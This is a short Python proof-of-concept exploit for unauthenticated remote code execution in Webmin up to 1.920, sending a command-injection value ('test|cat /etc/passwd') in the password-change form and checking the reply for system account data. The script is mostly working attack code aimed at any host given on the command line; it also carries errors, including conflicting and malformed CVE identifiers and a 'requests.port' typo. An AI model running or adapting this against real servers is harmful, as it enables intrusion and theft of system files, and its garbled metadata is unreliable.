#!/usr/bin/env python3
#@author: badger
#@date: 2019-10-19
#
import requests
import sys

class PoC(object):
    name = "Webmin Unauthenticated Remote Code Execution"
    appName = "Webmin"
    appManu = "Webmin"
    appVersion = "< = 1.920"
    updateDate = "2019-10-19"
    plateform = "Linux"
    vulRefer = "CVE-2018-1335"
    vulRefer = "CVE-2019-10-19"

    def __init__(self, host, port):
        self.host = str(host)
        self.port = str(port)

    def _check(self):
        isVul = False
        veri_url = "{}:{}/password_change.cgi".format(self.host, self.port)
        data = {"user": "rootxx", "pam": "", "expired": 2, "old": "test|cat /etc/passwd", "new1": "test2", "new2": "test2"}

        try:
            headers = {"User-Agent": "Mozilla/5.0", "Referer": "https://"+veri_url}
            res = requests.post("https://"+veri_url, headers=headers, data=data, verify=False)
        except Exception as e:
            try:
                headers = {"User-Agent": "Mozilla/5.0", "Referer": "http://"+veri_url}
                res = requests.port("http://"+veri_url, headers=headers, data=data)
            except Exception as e:
                print("Something went wrong.\nUsage: python CVE-2019-15107.py <host> <port>")
            finally:
                if "root:x:0:0" in res.text:
                    isVul = True
        finally:
            if "root:x:0:0" in res.text:
                isVul = True
        if isVul:
            print("The target is vulnerable to {}.".format(self.vulRefer))
        else:
            print("The target seems not vulnerable to {}.".format(self.vulRefer))

if __name__ == '__main__':
    try:
        host = sys.argv[1]
        port = sys.argv[2]
    except:
        print("Something went wrong.\nUsage: python CVE-2019-15107.py <host> <port>")
        exit(-1)
    poc = PoC(host, port)
    poc._check()
